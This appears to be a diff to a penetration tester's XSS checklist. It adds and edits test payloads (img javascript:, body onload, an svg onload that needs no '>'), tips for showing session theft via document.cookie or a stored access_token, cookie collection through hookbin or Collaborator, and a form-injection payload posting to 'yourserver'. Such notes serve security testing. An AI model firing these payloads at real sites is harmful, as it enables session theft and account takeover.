@@ -30,16 +30,18 @@ Test values:
 	<img src="javascript:alert(document.location);">
 	<body onload=alert(document.location)>
 
-To demonstrate XSS impact, don't use alert('alert'). Determine whether session is stored in cookies or local storage and put that in the popup.
+To demonstrate XSS impact, don't use alert('1'). Determine whether session is stored in cookies or local storage and put that in the pop-up.
 	cookie: alert(document.cookie)
 	LocalStorage: alert(localStorage.getItem('access_token'))
 Use hookbin or Collaborator extension to collect cookies
 
+Use XSScope payload generator to increase impact
+	https://github.com/kleiton0x00/XSScope
+
+
+
 Reflected 
 	Test all parameters that might be reflected in response
-
-
-
 
 DOM
 	Sources
@@ -79,6 +81,9 @@ App-specific impact demonstration payloads
 	https://github.com/hakluke/weaponised-XSS-payloads
 	https://github.com/hoodoer/WP-XSS-Admin-Funcs
 
+
+No '>' allowed, no Html tags
+	<svg onload="alert(document.location)" <="" svg=""
 
 If you have a XSS in a <form> tag, close it and open a new form that you are controlling.
 "></form><form action="http://yourserver/>
